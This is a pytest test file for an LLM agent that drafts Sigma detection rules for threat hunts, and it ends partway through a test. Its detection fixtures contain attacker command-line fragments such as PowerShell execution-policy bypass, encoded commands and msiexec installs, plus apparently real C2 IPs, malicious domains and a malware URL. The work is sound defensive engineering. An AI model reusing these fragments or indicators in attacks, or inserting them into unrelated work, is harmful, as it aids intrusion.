"""Tests for hecate_agent.agents.llm.sigma_generator - Sigma rule drafting for hunts."""

import importlib.util
import json
import logging
import sys
from typing import Any, Dict
from unittest.mock import patch

import pytest
import yaml

from hecate_agent.agents.llm.sigma_generator import (
    SigmaGenerationInput,
    SigmaGeneratorAgent,
    _anchor_bare_filenames,
    _breadth_problem,
    _complete_indicator_lists,
    _platform_consistent_logsources,
    _field_type_problem,
    _partial_indicator_problem,
    _placeholder_problem,
    _strip_empty_filters,
    _pysigma_problem,
    _self_defeating_filter_problem,
    applicable_logsources,
)
from hecate_agent.agents.llm.sigma_generator import (
    VALID_LOGSOURCE_CATEGORIES,
    _LOGSOURCE_FIELDS,
)

# The technique list and indicator types of the reference event (MISP 476,
# Lotus Blossom / Chrysalis) -- the case that motivated this agent.
CHRYSALIS_TECHNIQUES = [
    "T1005",
    "T1027.007",
    "T1041",
    "T1059.003",
    "T1070.004",
    "T1071.001",
    "T1083",
    "T1105",
    "T1106",
    "T1140",
    "T1204.002",
    "T1543.003",
    "T1547.001",
    "T1574.002",
    "T1620",
]
CHRYSALIS_INDICATOR_TYPES = ["filename", "hostname", "ip-dst", "url"]


def _agent() -> SigmaGeneratorAgent:
    return SigmaGeneratorAgent.__new__(SigmaGeneratorAgent)


def _input(**overrides: Any) -> SigmaGenerationInput:
    base: Dict[str, Any] = {
        "hypothesis": "Adversaries side-load a DLL and beacon to C2",
        "hunt_id": "H-0612",
        "techniques": ["T1059.003"],
        "platforms": ["Windows"],
    }
    base.update(overrides)
    return SigmaGenerationInput(**base)


def _rule(**overrides: Any) -> Dict[str, Any]:
    rule: Dict[str, Any] = {
        "logsource_category": "process_creation",
        "title": "Masquerading svchost outside System32",
        "description": "Detects svchost.exe running from an unexpected path",
        "techniques": ["T1059.003"],
        "detection": {
            "selection": {"Image|endswith": "\\svchost.exe"},
            "filter": {"Image|startswith": "C:\\Windows\\System32"},
            "condition": "selection and not filter",
        },
        "falsepositives": ["Patch tooling staging binaries"],
        "level": "high",
    }
    rule.update(overrides)
    return rule


# --- Log source derivation -------------------------------------------------


def test_derives_every_logsource_the_source_intel_supports():
    """The bug this agent exists to fix: the hunt was scoped to process
    telemetry alone while the CTI carried C2 URLs, hostnames and file paths."""
    sources = applicable_logsources(CHRYSALIS_TECHNIQUES, CHRYSALIS_INDICATOR_TYPES)
    assert "network_connection" in sources
    assert "dns_query" in sources
    assert "file_event" in sources
    assert "registry_event" in sources
    assert "process_creation" in sources


def test_subtechnique_inherits_parent_mapping():
    assert applicable_logsources(["T1059.003"]) == ["process_creation"]


def test_indicator_types_alone_imply_logsources():
    """Techniques can be absent; indicator types are still direct evidence."""
    assert "network_connection" in applicable_logsources([], ["ip-dst"])
    assert "registry_event" in applicable_logsources([], ["regkey"])


def test_empty_input_falls_back_rather_than_generating_nothing():
    assert applicable_logsources([], []) == ["process_creation"]


def test_derivation_is_stable_and_sorted():
    a = applicable_logsources(CHRYSALIS_TECHNIQUES, CHRYSALIS_INDICATOR_TYPES)
    b = applicable_logsources(list(reversed(CHRYSALIS_TECHNIQUES)), CHRYSALIS_INDICATOR_TYPES)
    assert a == b == sorted(a)


# --- Rule rendering --------------------------------------------------------


def test_valid_rule_renders_parseable_sigma_yaml():
    rule, problem = _agent()._build_rule(_rule(), _input())
    assert rule is not None
    assert problem is None
    doc = yaml.safe_load(rule.rule_yaml)
    assert doc["logsource"] == {"category": "process_creation", "product": "windows"}
    assert doc["detection"]["condition"] == "selection and not filter"
    assert doc["status"] == "experimental"
    assert doc["tags"] == ["attack.t1059.003"]
    # The hunt link is a custom key, not Sigma's `related:`. That field
    # relates a rule to other Sigma rules and its id must be a UUID, so a
    # hunt id there made every rule unparseable.
    assert doc["hunt_id"] == "H-0612"
    assert "related" not in doc


def test_multi_platform_hunt_does_not_pin_a_product():
    """Pinning product: windows on a cross-platform hunt silently stops the
    rule matching everything else."""
    rule, _ = _agent()._build_rule(_rule(), _input(platforms=["Windows", "Linux"]))
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["logsource"] == {"category": "process_creation"}


def test_linux_file_rules_keep_the_hunt_platform():
    assert SigmaGeneratorAgent._logsource_block("file_event", ["Linux"]) == {"category": "file_event", "product": "linux"}


def test_containers_do_not_count_as_a_second_os():
    """H-0025 (Node-RED on IoT2050) was scoped Containers + Linux; its guidance
    rule had no product, and the SentinelOne query came out EndpointOS = "windows"."""
    assert SigmaGeneratorAgent._logsource_block("process_creation", ["Containers", "Linux"]) == {
        "category": "process_creation",
        "product": "linux",
    }
    assert SigmaGeneratorAgent._logsource_block("process_creation", ["Containers"]) == {"category": "process_creation"}


def test_rule_id_is_unique_per_rule():
    a, _ = _agent()._build_rule(_rule(), _input())
    assert a is not None
    b, _ = _agent()._build_rule(_rule(), _input())
    assert b is not None
    assert yaml.safe_load(a.rule_yaml)["id"] != yaml.safe_load(b.rule_yaml)["id"]


def test_filename_is_derived_and_filesystem_safe():
    rule, _ = _agent()._build_rule(_rule(title="C2 beacon: api.wiresguard.com/v1"), _input())
    assert rule is not None
    assert rule.filename.startswith("process_creation__")
    assert rule.filename.endswith(".yml")
    assert "/" not in rule.filename


# --- Validation ------------------------------------------------------------


def test_rejects_condition_naming_an_undefined_selection():
    """Still valid YAML and still looks like a rule -- pySigma only rejects
    it much later, after the hunt has been reviewed around it."""
    bad = _rule(detection={"selection": {"Image": "x"}, "condition": "selection and not filter"})
    rule, problem = _agent()._build_rule(bad, _input())
    assert rule is None
    assert problem is not None and "undefined selection" in problem


def test_accepts_wildcard_condition_when_a_selection_matches_the_stem():
    ok = _rule(
        detection={
            "selection_cmd": {"Image": "a"},
            "selection_net": {"Image": "b"},
            "condition": "1 of selection_*",
        }
    )
    rule, problem = _agent()._build_rule(ok, _input())
    assert problem is None and rule is not None


def test_rejects_unknown_logsource_category():
    rule, problem = _agent()._build_rule(_rule(logsource_category="telepathy"), _input())
    assert rule is None
    assert problem is not None and "unknown logsource_category" in problem


def test_rejects_detection_with_no_selection_blocks():
    rule, problem = _agent()._build_rule(_rule(detection={"condition": "selection"}), _input())
    assert rule is None
    assert problem is not None and "no selection blocks" in problem


def test_rejects_empty_title():
    rule, problem = _agent()._build_rule(_rule(title="   "), _input())
    assert rule is None
    assert problem is not None and "title is empty" in problem


def test_invalid_level_falls_back_rather_than_failing():
    rule, problem = _agent()._build_rule(_rule(level="catastrophic"), _input())
    assert rule is not None
    assert problem is None
    assert yaml.safe_load(rule.rule_yaml)["level"] == "medium"


def test_missing_falsepositives_gets_an_honest_placeholder():
    rule, _ = _agent()._build_rule(_rule(falsepositives=[]), _input())
    assert rule is not None
    fps = yaml.safe_load(rule.rule_yaml)["falsepositives"]
    assert fps and "Unknown" in fps[0]


def test_rule_techniques_keep_subtechnique_precision():
    """The hunt lost T1059.003 -> T1059; tags must not repeat that."""
    rule, _ = _agent()._build_rule(_rule(techniques=["attack.T1059.003"]), _input())
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["tags"] == ["attack.t1059.003"]


def test_rule_falls_back_to_hunt_techniques_when_model_tags_nothing():
    rule, _ = _agent()._build_rule(_rule(techniques=[]), _input(techniques=["T1071.001", "T1041"]))
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["tags"] == ["attack.t1041", "attack.t1071.001"]


def test_rule_is_untagged_when_the_hunt_has_no_techniques():
    """H-0014: no hunt techniques, and the model's own T1059.003 went through
    unchecked onto a Linux hunt."""
    rule, _ = _agent()._build_rule(_rule(techniques=["T1059.003"]), _input(techniques=[]))
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["tags"] == []


def test_modifier_written_into_the_value_is_rejected():
    """H-0012: `CommandLine: "|contains: '0928...'"` is an exact match on a
    string starting with a pipe, and pySigma accepts it."""
    detection = {
        "selection": {"CommandLine": "|contains: 'invoke-payload'", "Image|endswith": "\\rundll32.exe"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "modifier inside the value" in reason


def test_a_library_as_the_process_image_is_rejected():
    """H-0013: `Image|endswith: mscoree.dll` in process_creation, which can
    never match; the load is an image_load event."""
    detection = {"selection": {"Image|endswith": "\\mscoree.dll"}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "image_load" in reason


def test_a_library_in_image_load_is_accepted():
    detection = {
        "selection": {"ImageLoaded|endswith": "\\mscoree.dll", "Image|contains": "\\AppData\\"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="image_load", detection=detection), _input())
    assert rule is not None, reason


def test_excluding_the_unsigned_case_is_rejected():
    """H-0013 rerun: `not filter` with `Signed: false` kept only the signed,
    legitimate loads of mscoree.dll and never the malicious one."""
    detection = {
        "selection": {"ImageLoaded|endswith": "\\mscoree.dll"},
        "filter": {"Signed": False},
        "condition": "selection and not filter",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="image_load", detection=detection), _input())
    assert rule is None
    assert reason is not None and "only trusted binaries" in reason


def test_excluding_the_intels_own_indicator_is_rejected():
    """H-0012 rerun: the filter dropped events naming the pulse's delivery domain."""
    detection = {
        "selection": {"CommandLine|contains": "msiexec.exe /i"},
        "filter": {"OriginalFileName|re": "^https?://onlineview365\\.com/.*"},
        "condition": "selection and not filter",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input(indicators={"domain": ["onlineview365.com"]}))
    assert rule is None
    assert reason is not None and "onlineview365.com" in reason


def test_requiring_the_unsigned_case_is_accepted():
    detection = {
        "selection": {"ImageLoaded|endswith": "\\mscoree.dll", "Signed": False},
        "filter": {"Image|startswith": "C:\\Windows\\Microsoft.NET\\"},
        "condition": "selection and not filter",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="image_load", detection=detection), _input())
    assert rule is not None, reason


def test_a_template_path_is_a_placeholder():
    """H-0018: `C:\\path\\to\\malware.ps1`, copied from the draft's observables."""
    detection = {
        "selection": {"CommandLine|contains": "-ExecutionPolicy Bypass -File C:\\path\\to\\malware.ps1"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "placeholder" in reason


@pytest.mark.parametrize("value", ["\\rat.exe", "/tmp/malware.sh", "payload.bin"])
def test_a_stand_in_file_name_is_a_placeholder(value):
    detection = {"selection": {"Image|endswith": value}, "condition": "selection"}
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is None
    assert reason is not None and "stand-in file name" in reason


def test_command_line_switches_in_a_file_name_field_are_rejected():
    """H-0018: `TargetFilename|contains: -ExecutionPolicy Bypass -File`."""
    detection = {
        "selection": {"TargetFilename|contains": "-ExecutionPolicy Bypass -File", "Image|endswith": "\\powershell.exe"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(logsource_category="file_event", detection=detection), _input())
    assert rule is None
    assert reason is not None and "belong in CommandLine" in reason


def test_paths_with_spaces_and_unix_paths_are_not_switches():
    detection = {
        "selection": {"Image|endswith": "\\Program Files\\Vendor App\\app.exe", "CommandLine|contains": "-enc"},
        "condition": "selection",
    }
    rule, reason = _agent()._build_rule(_rule(detection=detection), _input())
    assert rule is not None, reason


# --- execute() -------------------------------------------------------------


def test_execute_returns_failure_without_an_llm():
    agent = SigmaGeneratorAgent(llm_enabled=False)
    result = agent.execute(_input())
    assert result.success is False
    assert result.error is not None and "requires an LLM" in result.error
    # The derivation is deterministic, so it is still reported on failure.
    assert result.data is not None
    assert result.data.logsources_considered == ["process_creation"]


def test_execute_drops_invalid_rules_but_keeps_valid_ones():
    payload = json.dumps({"rules": [_rule(), _rule(logsource_category="nonsense", title="bad")]})
    agent = SigmaGeneratorAgent(llm_enabled=True)
    with patch.object(agent, "_call_llm_with_retry", return_value=payload), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input())
    assert result.success is True
    assert result.data is not None
    assert len(result.data.rules) == 1
    assert any("nonsense" in r for r in result.data.rejected)


def test_execute_fails_when_every_rule_is_invalid():
    """Silently succeeding with zero rules would leave the hunt looking as
    though queries had been generated."""
    payload = json.dumps({"rules": [_rule(logsource_category="nonsense")]})
    agent = SigmaGeneratorAgent(llm_enabled=True)
    with patch.object(agent, "_call_llm_with_retry", return_value=payload):
        result = agent.execute(_input())
    assert result.success is False
    assert result.error is not None and "no log source produced a valid rule" in result.error


def test_execute_warns_about_uncovered_logsources():
    payload = json.dumps({"rules": [_rule()]})
    agent = SigmaGeneratorAgent(llm_enabled=True)
    with patch.object(agent, "_call_llm_with_retry", return_value=payload), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input(logsources=["process_creation", "dns_query"]))
    assert result.success is True
    assert any("dns_query" in w for w in result.warnings)


# --- Detection normalisation ----------------------------------------------


def test_infers_condition_for_a_single_selection_block():
    """Observed on every rule of a real 14B run: detection is emitted with
    one selection and no condition. With one block the intended condition
    has exactly one possible value."""
    raw = _rule(logsource_category="dns_query", detection={"selection": {"QueryName|contains": ["api.wiresguard.com"]}})
    # Supplied, as a real run would: an exact domain nothing supplied is now
    # rejected as invented, which is not what this test is about.
    rule, problem = _agent()._build_rule(raw, _input(indicators={"hostname": ["api.wiresguard.com"]}))
    assert rule is not None
    assert problem is None
    assert yaml.safe_load(rule.rule_yaml)["detection"]["condition"] == "selection"


def test_infers_condition_using_the_actual_block_name():
    raw = _rule(logsource_category="network_connection", detection={"beacon_traffic": {"DestinationHostname": "x"}})
    rule, _ = _agent()._build_rule(raw, _input())
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["detection"]["condition"] == "beacon_traffic"


def test_refuses_to_invent_an_operator_between_multiple_blocks():
    """Wiring two unlabelled blocks together as AND would be guessing at
    logic nobody wrote, and the rule would look reviewed."""
    raw = _rule(detection={"selection": {"a": "b"}, "filter": {"c": "d"}})
    rule, problem = _agent()._build_rule(raw, _input())
    assert rule is None
    assert problem is not None and "unknowable" in problem


def test_moves_a_top_level_condition_into_detection():
    raw = _rule(detection={"selection": {"CommandLine|contains": "b"}, "filter": {"User": "d"}})
    raw["condition"] = "selection and not filter"
    rule, problem = _agent()._build_rule(raw, _input())
    assert rule is not None
    assert problem is None
    assert yaml.safe_load(rule.rule_yaml)["detection"]["condition"] == "selection and not filter"


def test_drops_a_technique_tag_the_source_never_asserted():
    """A real run tagged a rule T1047.002, which does not exist."""
    rule, _ = _agent()._build_rule(
        _rule(techniques=["T1047.002"]),
        _input(techniques=["T1071.001", "T1574.002"]),
    )
    assert rule is not None
    tags = yaml.safe_load(rule.rule_yaml)["tags"]
    assert "attack.t1047.002" not in tags
    assert tags == ["attack.t1071.001", "attack.t1574.002"]


def test_keeps_a_technique_tag_the_source_did_assert():
    rule, _ = _agent()._build_rule(
        _rule(techniques=["T1071.001"]),
        _input(techniques=["T1071.001", "T1574.002"]),
    )
    assert rule is not None
    assert yaml.safe_load(rule.rule_yaml)["tags"] == ["attack.t1071.001"]


def test_technique_fallback_narrows_to_the_rules_own_logsource():
    """A DLL side-loading rule was tagged with all fifteen techniques the
    event carried -- exfiltration and registry persistence included --
    because every model-proposed tag had been rejected."""
    rule, _ = _agent()._build_rule(
        _rule(
            logsource_category="image_load",
            techniques=["T9999"],
            detection={
                "selection": {"ImageLoaded|endswith": "\\log.dll", "Image|endswith": "\\BluetoothService.exe"},
                "condition": "selection",
            },
        ),
        _input(techniques=CHRYSALIS_TECHNIQUES),
    )
    assert rule is not None
    tags = yaml.safe_load(rule.rule_yaml)["tags"]
    # T1574 (hijack execution flow) and T1620 (reflective load) are observable
    # in image_load; exfiltration over C2 is not.
    assert "attack.t1574.002" in tags
    assert "attack.t1041" not in tags
    assert len(tags) < len(CHRYSALIS_TECHNIQUES)


def test_technique_fallback_keeps_everything_when_logsource_maps_nothing():
    rule, _ = _agent()._build_rule(
        _rule(logsource_category="process_creation", techniques=["T9999"]),
        _input(techniques=["T1071.001"]),
    )
    assert rule is not None
    # T1071 is not a process_creation technique, so narrowing yields nothing
    # and the supplied list stands rather than the rule going untagged.
    assert yaml.safe_load(rule.rule_yaml)["tags"] == ["attack.t1071.001"]


# --- One call per log source (V1) ------------------------------------------


def test_one_llm_call_is_made_per_log_source():
    """The combined prompt asked for six rules in one response, which on a
    4096-token context lost every rule when the reply truncated."""
    agent = SigmaGeneratorAgent(llm_enabled=True)
    sources = ["process_creation", "network_connection", "dns_query"]
    calls = []

    def fake(prompt, *a, **k):
        calls.append(prompt)
        # A real call records its usage on the way out; llm_calls counts those
        # records rather than the log sources asked for, so the stub makes one.
        agent._log_llm_metrics("sigma-generator", "test-model", 10, 5, 0.0, 1)
        category = next(c for c in sources if f"and no other:\n    {c}" in prompt)
        return json.dumps({"rules": [_rule(logsource_category=category, title=f"{category} rule")]})

    with patch.object(agent, "_call_llm_with_retry", side_effect=fake), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input(logsources=sources))

    assert len(calls) == 3
    assert result.metadata["llm_calls"] == 3
    assert {r.logsource_category for r in result.data.rules} == set(sources)  # type: ignore


def test_each_prompt_names_only_its_own_log_source():
    """Offering another category's fields invites a borrowed field name, which
    matches nothing and fails silently at conversion."""
    agent = SigmaGeneratorAgent(llm_enabled=True)
    prompt = agent._build_prompt(_input(), "dns_query")
    assert "QueryName" in prompt
    assert "CommandLine" not in prompt
    assert "TargetObject" not in prompt


def test_one_log_source_failing_does_not_lose_the_others():
    """The point of splitting: a timeout costs one rule, not all of them."""
    agent = SigmaGeneratorAgent(llm_enabled=True)
    sources = ["process_creation", "network_connection"]

    def fake(prompt, *a, **k):
        if "network_connection" in prompt:
            raise TimeoutError("model timed out")
        return json.dumps({"rules": [_rule(logsource_category="process_creation")]})

    with patch.object(agent, "_call_llm_with_retry", side_effect=fake), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input(logsources=sources))

    assert result.success is True
    assert [r.logsource_category for r in result.data.rules] == ["process_creation"]  # type: ignore
    assert any("network_connection" in r for r in result.data.rejected)  # type: ignore
    assert any("network_connection" in w for w in result.warnings)


def test_a_rule_for_the_wrong_category_is_rejected_not_relabelled():
    """Relabelling would file process telemetry under DNS."""
    agent = SigmaGeneratorAgent(llm_enabled=True)
    payload = json.dumps({"rules": [_rule(logsource_category="process_creation")]})

    with patch.object(agent, "_call_llm_with_retry", return_value=payload):
        result = agent.execute(_input(logsources=["dns_query"]))

    assert result.success is False
    assert any("returned a process_creation rule instead" in r for r in result.data.rejected)  # type: ignore


def test_a_malformed_sibling_is_reported_even_when_a_good_rule_survives():
    agent = SigmaGeneratorAgent(llm_enabled=True)
    payload = json.dumps({"rules": [_rule(), _rule(logsource_category="nonsense", title="bad")]})

    with patch.object(agent, "_call_llm_with_retry", return_value=payload), patch.object(agent, "_get_provider") as provider:
        provider.return_value.provider_name = "test"
        result = agent.execute(_input(logsources=["process_creation"]))

    assert result.success is True
    assert len(result.data.rules) == 1  # type: ignore
    assert any("nonsense" in r for r in result.data.rejected)  # type: ignore


# --- Placeholder detection values are rejected (G6) -------------------------


class TestPlaceholderGuard:
    """8 of 25 rules drafted before this guard matched on scaffolding rather
    than an observable. They are valid Sigma and pass every structural check,
    so nothing else stopped them: they reached the operator looking exactly
    like real rules and matched nothing."""

    @staticmethod
    def _det(field, value):
        return {"selection": {field: value}, "condition": "selection"}

    @pytest.mark.parametrize(
        "value,fragment",
        [
            (".exe -c bad_command", "bad_command"),
            ("known-good-script.exe", "known-good"),
            ("known-good-file-name", "known-good"),
            ("ms-office-known-good-command", "known-good"),
            (".c2.example.com", "example.com"),
            ("%appdata%\\malicious", "malicious"),
            ("\\malicious-ai-tool.exe", "malicious"),
        ],
    )
    def test_placeholder_values_are_rejected(self, value, fragment):
        problem = _placeholder_problem(self._det("CommandLine|contains", value), {})
        assert problem is not None
        assert fragment in problem

    def test_the_prompts_own_example_values_are_rejected(self):
        """The model echoes this module's prompt back; "known-good" came from
        our own example block."""
        assert _placeholder_problem(self._det("FieldName|endswith", "value"), {}) is not None

    def test_an_impossible_ipv4_is_rejected(self):
        """123.456.789 cannot match anything -- it was invented, not observed."""
        problem = _placeholder_problem(self._det("DestinationIp|contains", "123.456.789"), {})
        assert "not a valid IPv4" in problem  # type: ignore

    def test_a_partial_ip_prefix_is_a_legitimate_contains_idiom(self):
        assert _placeholder_problem(self._det("DestinationIp|contains", "192.168."), {}) is None

    def test_an_empty_value_is_rejected(self):
        assert "empty" in _placeholder_problem(self._det("TargetFilename|endswith", ""), {})  # type: ignore

    @pytest.mark.parametrize(
        "value",
        [
            "\\powershell.exe",
            "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ".element.tw",
            "207e0d47c4e5493ef7313eb1faeb1c6195923c89f263e548609a6838dd91ec0c",
        ],
    )
    def test_real_observables_are_kept(self, value):
        assert _placeholder_problem(self._det("Image|endswith", value), {}) is None

    def test_a_value_the_cti_supplied_is_never_rejected(self):
        """If the intelligence really names it, that is an observable, and the
        guard must not second-guess the evidence."""
        det = self._det("QueryName", "malicious-update.example.com")
        assert _placeholder_problem(det, {}) is not None
        assert _placeholder_problem(det, {"hostname": ["malicious-update.example.com"]}) is None

    def test_nested_list_values_are_walked(self):
        det = {"selection": {"CommandLine|contains": ["legit.exe", "bad_command"]}, "condition": "selection"}
        assert _placeholder_problem(det, {}) is not None

    def test_the_condition_string_is_not_scanned_as_a_value(self):
        det = {"selection": {"Image|endswith": "\\cmd.exe"}, "condition": "selection and not filter"}
        assert _placeholder_problem(det, {}) is None

    @pytest.mark.parametrize("value", ["signed_binary_path", "target_process_name", "bad_command"])
    def test_a_bare_snake_case_identifier_describes_a_value_rather_than_being_one(self, value):
        """No denylist covers what the model invents fresh. A live run produced
        "signed_binary_path" past the known-placeholder list."""
        assert _placeholder_problem(self._det("Image|contains", value), {}) is not None

    @pytest.mark.parametrize("value", ["\\powershell.exe", "192.168.", ".element.tw", "--type=renderer", "-RunKey", "80"])
    def test_real_values_carry_a_separator_and_survive(self, value):
        """A path has a slash, a domain a dot, a flag a dash -- that is what
        separates them from a snake_case description."""
        assert _placeholder_problem(self._det("Image|contains", value), {}) is None

    @pytest.mark.parametrize(
        "value",
        [
            "wp_ajax_nopriv_fusion_form_submit_ajax",
            "admin_post_action",
            "fusion_form_submit",
            "api_v1_user_login",
        ],
    )
    def test_programmatic_identifiers_and_hooks_are_not_rejected(self, value):
        """Web application hooks, RPC endpoints, and action parameters are authentic
        programmatic identifiers rather than model-invented placeholder descriptions."""
        assert _placeholder_problem(self._det("cs-uri-query|contains", value), {}) is None


# --- Rendered rules are validated as Sigma, not just as YAML ---------------


@pytest.mark.skipif(
    importlib.util.find_spec("sigma") is None,
    reason="pysigma not installed; these assert on its parse results",
)
class TestPySigmaValidation:
    """The structural checks say whether a rule is coherent; they say nothing
    about whether it is Sigma. Three rules in the live corpus were valid YAML,
    passed every check, and could never match anything."""

    VALID = (
        "title: T\n"
        "id: 5f0b1d5a-1c9e-4a4e-9a1e-2c3d4e5f6a7b\n"
        "status: experimental\n"
        "logsource:\n  category: process_creation\n"
        "detection:\n  selection:\n    Image|endswith: \\cmd.exe\n  condition: selection\n"
        "level: medium\n"
    )

    def test_a_valid_rule_passes(self):
        assert _pysigma_problem(self.VALID) is None

    def test_a_query_dsl_operator_is_rejected(self):
        """H-0007 emitted a MongoDB-style `$or:` key, which Sigma reads as a
        field named `$or` and never matches."""
        bad = self.VALID.replace(
            "  selection:\n    Image|endswith: \\cmd.exe\n",
            "  selection:\n    $or:\n    - Image|endswith: \\cmd.exe\n",
        )
        assert "not valid Sigma" in _pysigma_problem(bad)  # type: ignore

    def test_an_unknown_modifier_is_rejected(self):
        """H-0005 used `|in`, which is not a Sigma modifier."""
        bad = self.VALID.replace("Image|endswith:", "Image|in:")
        problem = _pysigma_problem(bad)
        assert problem and "modifier" in problem.lower()

    def test_an_empty_detection_is_rejected(self):
        bad = self.VALID.replace(
            "detection:\n  selection:\n    Image|endswith: \\cmd.exe\n  condition: selection\n",
            "detection:\n  selection: {}\n  condition: selection\n",
        )
        assert _pysigma_problem(bad) is not None

    def test_a_hunt_id_field_does_not_break_parsing(self):
        """Regression: the hunt link used to go in Sigma's `related:`, whose
        id must be a UUID. That made all 17 rules in the corpus unparseable."""
        assert _pysigma_problem(self.VALID + "hunt_id: H-0007\n") is None

    def test_a_related_block_with_a_hunt_id_would_be_rejected(self):
        """Pins the bug itself, so the old shape cannot quietly come back."""
        bad = self.VALID + "related:\n- id: H-0007\n  type: derived\n"
        assert _pysigma_problem(bad) is not None


# These two must run even without pysigma -- they are the guard against it
# passing everything silently, which is the whole failure mode.
def test_a_missing_pysigma_warns_rather_than_passing_silently(monkeypatch, caplog):
    """A validator that silently accepts everything is worse than none."""
    import hecate_agent.agents.llm.sigma_generator as sg

    monkeypatch.setattr(sg, "_PYSIGMA_WARNED", False)
    monkeypatch.setitem(sys.modules, "sigma.collection", None)
    with caplog.at_level(logging.WARNING):
        assert sg._pysigma_problem("anything") is None
    assert "not being validated" in caplog.text.lower()


def test_the_missing_pysigma_warning_is_emitted_once(monkeypatch, caplog):
    import hecate_agent.agents.llm.sigma_generator as sg

    monkeypatch.setattr(sg, "_PYSIGMA_WARNED", False)
    monkeypatch.setitem(sys.modules, "sigma.collection", None)
    with caplog.at_level(logging.WARNING):
        sg._pysigma_problem("a")
        sg._pysigma_problem("b")
    assert caplog.text.lower().count("not being validated") == 1


@pytest.mark.unit
class TestIndicatorGrounding:
    """A rule that ignores the indicators its own intelligence supplied is
    detecting something else. Both cases below are drafted rules, not
    hypotheticals."""

    SUPPLIED = {"domain": ["domainlify.net", "service-nowinc.com"]}

    def test_a_split_indicator_is_rejected(self):
        """The drafted rule turned `domainlify.net` into two partial matches,
        broadening it to every .net domain and leaving no complete indicator
        for the grounding audit to find."""
        detection = {
            "selection": {"QueryName|endswith": ".net", "QueryName|contains": "domainlify"},
            "condition": "selection",
        }
        problem = _partial_indicator_problem(detection, self.SUPPLIED, "dns_query")
        assert problem is not None
        assert "domainlify.net" in problem

    def test_a_behavioural_rule_using_no_indicator_passes(self):
        """The check targets fragmentation, not absence. An earlier version
        demanded an indicator and rejected every rule on three consecutive live
        cycles, leaving drafts with no detection section at all -- while the
        prompt itself asks for behaviour where generalising is right."""
        detection = {
            "selection": {"Image|endswith": "\\powershell.exe", "CommandLine|contains": "-enc"},
            "condition": "selection",
        }
        assert _partial_indicator_problem(detection, self.SUPPLIED, "dns_query") is None

    def test_a_hostname_that_also_sits_inside_a_supplied_url_passes(self):
        supplied = {
            "hostname": ["admin.rshiahub.com"],
            "url": ["http://admin.rshiahub.com/bin/x.msi"],
        }
        detection = {"selection": {"DestinationHostname": "admin.rshiahub.com"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, supplied, "network_connection") is None

    def test_a_complete_indicator_passes(self):
        detection = {
            "selection": {"QueryName|contains": ["domainlify.net", "service-nowinc.com"]},
            "condition": "selection",
        }
        assert _partial_indicator_problem(detection, self.SUPPLIED, "dns_query") is None

    def test_one_complete_indicator_is_enough(self):
        detection = {"selection": {"QueryName|contains": "domainlify.net"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, self.SUPPLIED, "dns_query") is None

    def test_a_process_rule_is_not_judged_against_a_domain(self):
        """Type-aware on purpose, using the same map that picked the log
        source: process telemetry cannot match a domain."""
        detection = {"selection": {"CommandLine|contains": "rundll32"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, self.SUPPLIED, "process_creation") is None

    def test_short_values_are_not_treated_as_fragments(self):
        """ "exe" and "tmp" are ordinary rule vocabulary and collide with
        indicator substrings by accident."""
        detection = {"selection": {"QueryName|contains": "net"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, self.SUPPLIED, "dns_query") is None

    def test_no_supplied_indicators_means_no_constraint(self):
        detection = {"selection": {"QueryName|contains": "anything"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, {}, "dns_query") is None

    def test_port_number_in_network_connection_is_not_treated_as_fragment(self):
        supplied = {"url": ["http://38.207.178.192:50813/EasyConnectUpdata_Log.txt"]}
        detection = {"selection": {"DestinationPort": "50813"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, supplied, "network_connection") is None

    def test_decomposed_url_components_hostname_and_path_pass(self):
        supplied = {"url": ["http://38.207.178.192:50813/EasyConnectUpdata_Log.txt"]}
        detection = {"selection": {"TargetFilename|endswith": "EasyConnectUpdata_Log.txt"}, "condition": "selection"}
        assert _partial_indicator_problem(detection, supplied, "file_event") is None


@pytest.mark.unit
class TestPlatformConsistentLogsources:
    def test_registry_is_dropped_for_a_non_windows_hunt(self):
        """H-0004 (macOS, Linux) was drafted a registry_event rule."""
        kept = _platform_consistent_logsources(["network_connection", "registry_event"], ["macOS", "Linux"])
        assert kept == ["network_connection"]

    def test_registry_is_kept_when_windows_is_in_scope(self):
        kept = _platform_consistent_logsources(["registry_event"], ["Windows", "Linux"])
        assert kept == ["registry_event"]

    def test_unknown_scope_drops_nothing(self):
        assert _platform_consistent_logsources(["registry_event"], []) == ["registry_event"]

    def test_never_leaves_nothing_to_draft(self):
        assert _platform_consistent_logsources(["registry_event"], ["macOS"]) == ["process_creation"]


@pytest.mark.unit
class TestCompleteIndicatorLists:
    """H-0004: four C2 IPs supplied, both network rules matched one."""

    SUPPLIED = {
        "IPv4": ["166.88.134.62", "23.27.13.135", "166.88.73.46", "193.247.144.38"],
        "domain": ["pipicka.xyz"],
    }

    def test_one_supplied_ip_is_widened_to_all_of_them(self):
        detection = {"selection": {"DestinationIp": "166.88.134.62"}, "condition": "selection"}
